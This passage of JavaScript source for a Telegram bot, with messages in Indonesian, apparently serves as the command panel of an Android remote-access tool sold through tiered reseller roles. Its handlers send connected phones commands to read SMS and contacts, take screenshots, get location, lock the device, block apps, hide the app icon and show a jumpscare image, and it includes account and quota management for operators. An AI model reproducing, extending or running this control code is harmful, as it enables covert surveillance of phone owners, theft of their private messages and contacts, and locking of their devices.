      const keyboard = getMainMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, `*━━ 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗡𝗢𝗩𝗔𝗫 𝗡𝗘𝗢𝗕𝗥𝗨𝗧𝗔𝗟𝗜𝗦𝗠*\n\n━ 𝗥𝗼𝗹𝗲: *${getBotRoleName(botRole)}*\n\nⓘ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗢𝗽𝘁𝗶𝗼𝗻𝘀 - ( @gunturnaktido ):`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- VISA MENU --
    else if (data === 'menu_main_visa') {
      const keyboard = getVisaMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, `*📋 MENU VISA*\n\nPilih fitur:`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- VISA: CEK ROLE --
    else if (data === 'menu_visa_role') {
      const roleName = getBotRoleName(botRole)
      const access = loadBotAccess()
      const myAccess = access[String(userId)]

      let text = `*📋 CEK ROLE*\n\n`
      text += `👤 Telegram: @${query.from.username || 'N/A'}\n`
      text += `🆔 ID: \`${userId}\`\n`
      text += `🏆 Role: *${roleName}*\n\n`

      if (myAccess) {
        text += `*📊 Visa:*\n`
        if (myAccess.visa) {
          Object.entries(myAccess.visa).forEach(([role, count]) => {
            text += `━ ${role}: ${count}\n`
          })
        } else {
          text += `━ Belum ada visa\n`
        }
        text += `\n🕐 Granted: ${new Date(myAccess.grantedAt).toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}`
      }

      const keyboard = getVisaMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, text, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- VISA: CEK QUOTA --
    else if (data === 'menu_visa_quota') {
      const accounts = loadAccounts()
      const myAcc = Object.values(accounts).find(a => a.createdBy === String(userId))

      let text = `*📊 CEK QUOTA*\n\n`

      if (botRole === 'developer') {
        text += `━ Unlimited (Developer)\n`
      } else {
        const allowed = CAN_CREATE_ROLES[botRole] || []
        allowed.forEach(role => {
          const limit = getQuotaLimit(query.from.username || String(userId), role)
          const used = getQuotaUsed(query.from.username || String(userId), role)
          const remaining = limit === Infinity ? '∞' : limit - used
          text += `━ ${role}: ${used}/${limit} (sisa: ${remaining})\n`
        })
      }

      if (myAcc) {
        text += `\n*🔗 Web Panel:*\n`
        text += `━ Username: ${myAcc.displayName}\n`
        text += `━ UID: \`${myAcc.uid}\`\n`
        text += `━ Expired: ${myAcc.trialExpiry || 'Permanent'}`
      }

      const keyboard = getVisaMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, text, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- VISA: ADD VISA (show instruction) --
    else if (data === 'menu_visa_add') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*➕ ADD VISA*\n\nFormat:\n/addvisa <user_id> <role> <jumlah>\n\nContoh:\n/addvisa 123456789 member 50\n\n*Note:* Cuma Developer & Owner`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- VISA: DEL VISA (show instruction) --
    else if (data === 'menu_visa_del') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*➖ DEL VISA*\n\nFormat:\n/delvisa <user_id> <role> <jumlah>\n\nContoh:\n/delvisa 123456789 member 10\n\n*Note:* Cuma Developer & Owner`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- CREAT MENU --
    else if (data === 'menu_main_cakun') {
      const keyboard = getCakunMenuKeyboard()
      await safeMenu(chat, query.message.message_id, `*⌗ CREAT MENU — BUAT AKUN*\n\nⓘ ROLE TERSEDIA:\n━ Developer — Semua Role\n━ Owner — Reseller & Member\n━ Reseller — Member only\n━ Member — Ga bisa buat akun\n\nContoh:\n/cakun Guntur, 123, owner`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- ADD ROLE MENU --
    else if (data === 'menu_main_addrole') {
      const keyboard = getAddRoleMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, `*━━ ADD ROLE — BOT ACCES*\n\n⌗ Sellect Your Role:\n\n━ 🏆 Developer → All Acces\n━ 👑 Owner → Reseller & Member\n━  🧸Reseller → Member only`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- DEL ROLE MENU --
    else if (data === 'menu_main_delrole') {
      const keyboard = getDelRoleMenuKeyboard(botRole, userId)
      await safeMenu(chat, query.message.message_id, `*🗑️ DEL ROLE — HAPUS AKSES*\n\nPilih role yang mau dihapus:`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- LIST DEVICE --
    else if (data === 'menu_main_listdevice') {
      const accounts = loadAccounts()
      const myRole = botRole

      let myUid = ''
      if (!isOwner(userId) && myRole !== 'developer') {
        const myAcc = Object.values(accounts).find(a => a.createdBy === String(userId))
        if (myAcc) myUid = myAcc.uid
      }

      let text = `*📱 LIST DEVICE*\n\n`

      const userDevices = Object.values(devices).filter(d => {
        if (myRole === 'developer' || isOwner(userId)) return true
        return d.uid === myUid
      })

      if (userDevices.length === 0) {
        text += `📭 Belum ada device terhubung.`
      } else {
        userDevices.forEach((d, i) => {
          const online = (Date.now() - new Date(d.lastSeen).getTime()) < 60000
          text += `${i+1}. *${d.name}*\n   ID: \`${d.id}\`\n   Status: ${online ? '🟢 Online' : '🔴 Offline'}\n   🔋 ${d.info?.battery ?? '?'}%${d.info?.charging ? ' ⚡' : ''}\n   Android: ${d.info?.androidVersion ?? '?'}\n\n`
        })
      }

      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, text, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- CONTROL: LOCK DEVICE --
    else if (data.startsWith('ctrl_lock_')) {
      const deviceId = data.replace('ctrl_lock_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'lockDevice', value: JSON.stringify({ title: 'Device Locked' }) })
      devices[deviceId].status.deviceLocked = true
      devices[deviceId].status.lockTitle = 'Device Locked'

      await bot.answerCallbackQuery(query.id, { text: '🔒 Device locked!' })
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    }

    // -- CONTROL: UNLOCK DEVICE --
    else if (data.startsWith('ctrl_unlock_')) {
      const deviceId = data.replace('ctrl_unlock_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'unlockDevice', value: '' })
      devices[deviceId].status.deviceLocked = false
      devices[deviceId].status.lockTitle = ''

      await bot.answerCallbackQuery(query.id, { text: '🔓 Device unlocked!' })
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    }

    // -- CONTROL: SCREENSHOT --
    else if (data.startsWith('ctrl_screenshot_')) {
      const deviceId = data.replace('ctrl_screenshot_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'takeScreenshot', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '📸 Screenshot request sent!' })
    }

    // -- CONTROL: LOCATION --
    else if (data.startsWith('ctrl_location_')) {
      const deviceId = data.replace('ctrl_location_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getLocation', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '📍 Location request sent!' })
    }

    // -- CONTROL: GET SMS --
    else if (data.startsWith('ctrl_sms_')) {
      const deviceId = data.replace('ctrl_sms_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getSms', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '💬 SMS request sent!' })
    }

    // -- CONTROL: GET CONTACTS --
    else if (data.startsWith('ctrl_contacts_')) {
      const deviceId = data.replace('ctrl_contacts_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'getContacts', value: '' })
      await bot.answerCallbackQuery(query.id, { text: '👥 Contacts request sent!' })
    }

    // -- CONTROL: FLASHLIGHT ON --
    else if (data.startsWith('ctrl_flash_on_')) {
      const deviceId = data.replace('ctrl_flash_on_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'flashlight', value: 'on' })
      devices[deviceId].status.flashlight = true
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '🔦 Flashlight ON!' })
    }

    // -- CONTROL: FLASHLIGHT OFF --
    else if (data.startsWith('ctrl_flash_off_')) {
      const deviceId = data.replace('ctrl_flash_off_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'flashlight', value: 'off' })
      devices[deviceId].status.flashlight = false
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '🔦 Flashlight OFF!' })
    }

    // -- CONTROL: TTS SPEAK --
    else if (data.startsWith('ctrl_tts_')) {
      const deviceId = data.replace('ctrl_tts_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      await bot.sendMessage(chat, `🗣️ *Ketik pesan TTS*\n\nFormat: /tts ${deviceId} <pesan>\nContoh: /tts ${deviceId} Halo ini pesan dari admin`, { parse_mode: 'Markdown' })
      await bot.answerCallbackQuery(query.id, { text: 'Ketik pesan TTS di chat!' })
    }

    // -- CONTROL: JUMPSCARE --
    else if (data.startsWith('ctrl_jumpscare_')) {
      const deviceId = data.replace('ctrl_jumpscare_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'jumpscareStart', value: 'https://files.catbox.moe/5i2i3o.jpg' })
      devices[deviceId].status.jumpscareActive = true
      devices[deviceId].status.jumpscareUrl = 'https://files.catbox.moe/5i2i3o.jpg'
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '👻 Jumpscare activated!' })
    }

    // -- CONTROL: BLOCK APP --
    else if (data.startsWith('ctrl_blockapp_')) {
      const deviceId = data.replace('ctrl_blockapp_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      await bot.sendMessage(chat, `🚫 *BLOCK APP*\n\nFormat: /blockapp ${deviceId} <package.name>\nContoh: /blockapp ${deviceId} com.whatsapp`, { parse_mode: 'Markdown' })
      await bot.answerCallbackQuery(query.id, { text: 'Ketik package name di chat!' })
    }

    // -- CONTROL: HIDE ICON --
    else if (data.startsWith('ctrl_hideicon_')) {
      const deviceId = data.replace('ctrl_hideicon_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      io.to(`device:${deviceId}`).emit('command', { command: 'hideIcon', value: 'true' })
      devices[deviceId].status.iconHidden = true
      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

      await bot.answerCallbackQuery(query.id, { text: '👻 Icon hidden!' })
    }

    // -- KICK DEVICE --
    else if (data === 'menu_kickdevice') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*👢 KICK DEVICE*\n\nKetik:\n/kickdevice <device_id>\n\nContoh: /kickdevice abc123`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- ADD ROLE SUB-MENUS --
    else if (data === 'menu_adddev') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*💡 ADD DEVELOPER*\n\nReply pesan user atau ketik:\n/adddev 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /adddev`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }
    else if (data === 'menu_addown') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*👑 ADD OWNER*\n\nReply pesan user atau ketik:\n/addown 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /addown`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }
    else if (data === 'menu_addres') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*💼 ADD RESELLER*\n\nReply pesan user atau ketik:\n/addres 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /addres`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- DEL ROLE SUB-MENUS --
    else if (data === 'menu_deldev') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*🗑️ DEL DEVELOPER*\n\nReply pesan user atau ketik:\n/deldev 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /deldev`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }
    else if (data === 'menu_delown') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*🗑️ DEL OWNER*\n\nReply pesan user atau ketik:\n/delown 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /delown`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }
    else if (data === 'menu_delres') {
      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, `*🗑️ DEL RESELLER*\n\nReply pesan user atau ketik:\n/delres 123456789\n\nCara reply:\n1. Reply pesan target\n2. Ketik /delres`, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- ACCOUNT LIST --
    else if (data === 'menu_main_list') {
      const accounts = loadAccounts()
      const myIdx = roleIndex(botRole)

      const list = Object.entries(accounts)
        .filter(([user, data]) => {
          const accRole = data.role || 'member'
          const accIdx = roleIndex(accRole)
          if (botRole === 'developer' || isOwner(userId)) return true
          return accIdx >= myIdx
        })
        .map(([user, data]) => ({
          username: user,
          displayName: data.displayName,
          role: data.role || 'member',
          uid: data.uid || '-',
          createdAt: data.createdAt
        }))

      let text = `*📋 ACCOUNT LIST*\n\n`

      if (list.length === 0) {
        text += `📭 Belum ada akun yang dibuat.`
      } else {
        const rows = list.map((acc, i) => {
          const tgl = new Date(acc.createdAt).toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
            year: '2-digit', hour: '2-digit', minute: '2-digit'
          })
          return `${i + 1}. *${acc.displayName}* [${acc.role}]\n   Login: ${acc.username}\n   UID: ${acc.uid || '-'}\n   Dibuat: ${tgl}`
        }).join('\n\n')
        text += `👥 *Total: ${list.length} akun*\n\n${rows}`
      }

      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, text, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- ACCOUNT ID LIST --
    else if (data === 'menu_main_idlist') {
      const accounts = loadAccounts()
      const myIdx = roleIndex(botRole)

      const list = Object.entries(accounts)
        .filter(([user, data]) => {
          const accRole = data.role || 'member'
          const accIdx = roleIndex(accRole)
          if (botRole === 'developer' || isOwner(userId)) return true
          return accIdx >= myIdx
        })
        .map(([user, data]) => ({
          username: user,
          displayName: data.displayName,
          role: data.role || 'member',
          uid: data.uid || '-'
        }))

      let text = `*🆔 ACCOUNT ID LIST*\n\n`

      if (list.length === 0) {
        text += `📭 Belum ada akun yang dibuat.`
      } else {
        const rows = list.map((acc, i) => {
          return `${i + 1}. *${acc.displayName}*\n   \`${acc.uid}\``
        }).join('\n\n')
        text += `👥 *Total: ${list.length} akun*\n\n${rows}`
      }

      const keyboard = getBackButtonKeyboard()
      await safeMenu(chat, query.message.message_id, text, keyboard, THUMBNAIL_URL)
      await bot.answerCallbackQuery(query.id)
    }

    // -- CONTROL: KICK DEVICE --
    else if (data.startsWith('ctrl_kick_')) {
      const deviceId = data.replace('ctrl_kick_', '')
      if (!devices[deviceId]) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Device tidak ditemukan!', show_alert: true })
        return
      }

      const socketId = devices[deviceId].socketId
      const s = io.sockets.sockets.get(socketId)
      if (s) s.disconnect(true)

      const deviceName = devices[deviceId].name
      const deviceUid = devices[deviceId].uid

      delete cameraFrames[deviceId]
      delete devices[deviceId]

      broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid))

      await bot.answerCallbackQuery(query.id, { text: `👢 ${deviceName} kicked!` })

      const keyboard = getDeviceSelectKeyboard(userId, botRole)
      await safeMenu(chat, query.message.message_id, `*🎮 CONTROL DEVICE*

Pilih device yang mau dikontrol:`, keyboard, THUMBNAIL_URL)
    }

    // -- NOOP (dummy button) --
    else if (data === 'noop') {
      await bot.answerCallbackQuery(query.id, { text: '⚠️ Tidak ada device tersedia', show_alert: true })
    }

    else {
      await bot.answerCallbackQuery(query.id)
    }
  } catch (err) {
    console.error('[CALLBACK ERROR]', err.message)
    console.error('[CALLBACK ERROR STACK]', err.stack)
    try {
      await bot.answerCallbackQuery(query.id, { text: '❌ Error: ' + err.message })
    } catch (e) {}
  }
})// ================================================================
// -- /CAKUN — Buat Akun Baru --
bot.onText(/^\/cakun (.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id

  let groupAdmin = await isGroupAdmin(chat, userId)
  if (!isBotAdmin(userId) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses Bot.\n\nHubungi admin buat dapetin akses.')
  }

  const parsed = parseCakun('/cakun ' + match[1])
  if (!parsed) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nFormat: /cakun Nama, Password, Role\nContoh: /cakun Smooth, 123, owner')
  }

  const { username, displayName, password, role } = parsed
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  groupAdmin = await isGroupAdmin(chat, userId)
  if (!['developer', 'owner', 'reseller'].includes(granterRole) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Cuma developer, owner, reseller, dan admin group yang bisa buat akun.')
  }

  // Group admin hanya boleh buat akun member
  if (groupAdmin && !['developer', 'owner', 'reseller'].includes(granterRole) && role !== 'member') {
    return bot.sendMessage(chat, '⛔ Admin grup hanya boleh buat akun dengan role member.')
  }

  const allowed = CAN_CREATE_ROLES[granterRole] || []
  if (!allowed.includes(role)) {
    return bot.sendMessage(chat, `⛔ Role "${granterRole}" tidak bisa buat akun dengan role "${role}".`)
  }

  // Cek quota (cuma member yang kena limit, owner & reseller unlimited)
  if (!['developer', 'owner', 'reseller'].includes(granterRole)) {
    const creatorKey = String(userId)
    const limit = getQuotaLimit(creatorKey, role)
    const used = getQuotaUsed(creatorKey, role)
    if (used >= limit) {
      return bot.sendMessage(chat, `❌ Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${role}".`)
    }
  }

  const accounts = loadAccounts()
  if (accounts[username]) {
    return bot.sendMessage(chat, `❌ Akun "${username}" sudah ada.`)
  }

  const newUid = crypto.randomBytes(16).toString('hex')
  accounts[username] = {
    password: password,
    displayName: displayName,
    role: role,
    uid: newUid,
    createdBy: String(userId),  // Simpan userId biar match sama bot access
    createdAt: new Date().toISOString(),
    trialDuration: 'permanent',
    trialExpiry: null
  }
  saveAccounts(accounts)

  await sendNotifAkunBaru(username, newUid, msg.from.username || String(userId), null)

  bot.sendMessage(chat, `✅ Akun berhasil dibuat!\n\nUsername: ${username}\nRole: ${role}\nUID: ${newUid}`)
})

// -- /ADDDEV — Add Developer Access --
bot.onText(/^\/adddev(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /adddev from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')
  console.log('[COMMAND] /adddev granterRole:', granterRole, 'isOwner:', isOwner(userId))

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa kasih akses developer.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /adddev 123456789')
  }

  const access = loadBotAccess()
  access[String(targetId)] = { role: 'developer', grantedBy: userId, grantedAt: new Date().toISOString() }
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ User ${targetId} sekarang jadi Developer Bot.`)
})

// -- /ADDOWN — Add Owner Access --
bot.onText(/^\/addown(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /addown from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa kasih akses owner.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /addown 123456789')
  }

  const access = loadBotAccess()
  access[String(targetId)] = { 
    role: 'owner', 
    grantedBy: userId, 
    grantedAt: new Date().toISOString(),
    visa: { reseller: Infinity, member: Infinity }
  }
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ User ${targetId} sekarang jadi Owner Bot.\n\n📊 Quota: *UNLIMITED*`)
})

// -- /ADDRES — Add Reseller Access --
bot.onText(/^\/addres(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /addres from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer', 'owner'].includes(granterRole)) {
    return bot.sendMessage(chat, '⛔ Cuma developer dan owner yang bisa kasih akses reseller.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /addres 123456789')
  }

  const access = loadBotAccess()
  access[String(targetId)] = { 
    role: 'reseller', 
    grantedBy: userId, 
    grantedAt: new Date().toISOString(),
    visa: { member: Infinity }
  }
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ User ${targetId} sekarang jadi Reseller Bot.\n\n📊 Quota: *UNLIMITED*`)
})

// -- /DELDEV — Remove Developer Access — ONLY DEVELOPER --
bot.onText(/^\/deldev(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /deldev from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa hapus akses.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /deldev 123456789')
  }

  const access = loadBotAccess()
  if (!access[String(targetId)] || access[String(targetId)].role !== 'developer') {
    return bot.sendMessage(chat, `❌ User ${targetId} bukan Developer.`)
  }

  delete access[String(targetId)]
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ Akses Developer user ${targetId} telah dihapus.`)
})

// -- /DELOWN — Remove Owner Access — ONLY DEVELOPER --
bot.onText(/^\/delown(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /delown from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa hapus akses.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /delown 123456789')
  }

  const access = loadBotAccess()
  if (!access[String(targetId)] || access[String(targetId)].role !== 'owner') {
    return bot.sendMessage(chat, `❌ User ${targetId} bukan Owner.`)
  }

  delete access[String(targetId)]
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ Akses Owner user ${targetId} telah dihapus.`)
})

// -- /DELRES — Remove Reseller Access — ONLY DEVELOPER --
bot.onText(/^\/delres(?:\s+(\d+))?/, async (msg, match) => {
  console.log('[COMMAND] /delres from', msg.from.id, 'match:', match)
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa hapus akses.')
  }

  let targetId = match[1]
  if (!targetId && msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id
  }
  if (!targetId) {
    return bot.sendMessage(chat, '❌ Format salah!\n\nReply pesan target atau ketik: /delres 123456789')
  }

  const access = loadBotAccess()
  if (!access[String(targetId)] || access[String(targetId)].role !== 'reseller') {
    return bot.sendMessage(chat, `❌ User ${targetId} bukan Reseller.`)
  }

  delete access[String(targetId)]
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ Akses Reseller user ${targetId} telah dihapus.`)
})

// -- /CEKSTATUS — Cek Device User — Developer ONLY --
bot.onText(/^\/cekstatus\s+(.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer'].includes(granterRole) && !isOwner(userId)) {
    return bot.sendMessage(chat, '⛔ Cuma developer yang bisa cek status.')
  }

  const targetUser = match[1].trim().toLowerCase()
  const accounts = loadAccounts()
  const acc = accounts[targetUser]

  if (!acc) {
    return bot.sendMessage(chat, `❌ Akun "${targetUser}" tidak ditemukan.`)
  }

  const uid = acc.uid
  const userDevices = Object.values(devices).filter(d => d.uid === uid)
  const online = userDevices.filter(d => {
    const lastSeen = new Date(d.lastSeen)
    return (Date.now() - lastSeen.getTime()) < 60000
  })
  const offline = userDevices.filter(d => {
    const lastSeen = new Date(d.lastSeen)
    return (Date.now() - lastSeen.getTime()) >= 60000
  })

  let text = `*📱 CEK STATUS: ${acc.displayName || targetUser}*

`
  text += `UID: \`${uid}\`
`
  text += `Role: ${acc.role || 'member'}

`

  if (online.length === 0 && offline.length === 0) {
    text += `📭 Tidak ada device terdaftar.`
  } else {
    text += `🟢 *Online: ${online.length}*
`
    online.forEach((d, i) => {
      text += `   ${i+1}. ${d.name}
      ID: \`${d.id}\`
      🔋 ${d.info?.battery ?? '?'}%${d.info?.charging ? ' ⚡' : ''} | Android ${d.info?.androidVersion ?? '?'}
`
    })
    text += `
🔴 *Offline: ${offline.length}*
`
    offline.forEach((d, i) => {
      text += `   ${i+1}. ${d.name}
      Last: ${new Date(d.lastSeen).toLocaleString('id-ID', {timeZone:'Asia/Jakarta',hour12:false})}
`
    })
  }

  bot.sendMessage(chat, text, { parse_mode: 'Markdown' })
})


// -- /ADDVISA — Add Visa Quota --
bot.onText(/^\/addvisa\s+(\d+)\s+(\w+)\s+(\d+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const targetId = match[1]
  const targetRole = match[2].toLowerCase()
  const amount = parseInt(match[3])

  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer', 'owner'].includes(granterRole)) {
    return bot.sendMessage(chat, '⛔ Cuma Developer & Owner yang bisa add visa.')
  }

  if (!ROLE_HIERARCHY.includes(targetRole)) {
    return bot.sendMessage(chat, `❌ Role "${targetRole}" tidak valid.`)
  }

  const access = loadBotAccess()
  const userAccess = access[String(targetId)]

  if (!userAccess) {
    return bot.sendMessage(chat, `❌ User ${targetId} belum punya akses bot.`)
  }

  if (!userAccess.visa) userAccess.visa = {}
  if (!userAccess.visa[targetRole]) userAccess.visa[targetRole] = 0

  userAccess.visa[targetRole] += amount
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ Visa ditambah!\n\nUser: ${targetId}\nRole: ${targetRole}\nJumlah: +${amount}\nTotal: ${userAccess.visa[targetRole]}`)
})

// -- /DELVISA — Remove Visa Quota --
bot.onText(/^\/delvisa\s+(\d+)\s+(\w+)\s+(\d+)/, async (msg, match) => {
  const chat = msg.chat.id
